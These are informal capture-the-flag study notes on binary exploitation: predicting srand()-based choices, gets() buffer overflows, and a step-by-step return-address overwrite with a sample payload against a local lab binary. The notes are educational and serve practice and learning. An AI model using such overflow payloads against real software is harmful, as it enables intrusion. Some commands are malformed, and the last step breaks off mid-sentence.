### EXAMPLES

---

### EX-1

Pwn question - Win 5 times in a row in rock paper scissor for the flag. Count based pwning challenge.
Vulnerability due to srand() which generates randok choices and makes it hard to infiltrate into the system.

Soln - Write a script which takes input the same as the computer to match it's output on every round.

---

### EX-2

Buffer overflow - Gets() function is vulnerable and stores characters beyond the specified size as well.
Better to use fgets(), if gets() function is in the source code, try to overflow the function with a larger input.

---

### EX-2

Buffer Overflow 2- Sometimes, just overflowing the function isn't enough. We need to control the return address and point it towards the flag.

Steps -

1. Info func
2. disassemble main, vuln, flag etc
3. run the program and overflow it
4. Find the offset
5. cyclic 100
6. Let's say offset is 44 now
7. python3 'print "A" * 44'
8. Now, we want to return the address of win function for instance, the string after 44 will reach the EIP and hence, the function could be executed.
9. So python3 'print ("A" * 44 +  "\xf6\x91\x49\x80")' > payload
10. echo "fake_flag" > flag.txt
11. ./vuln < payload
12. If it doesn't work try with the very next address from 

---
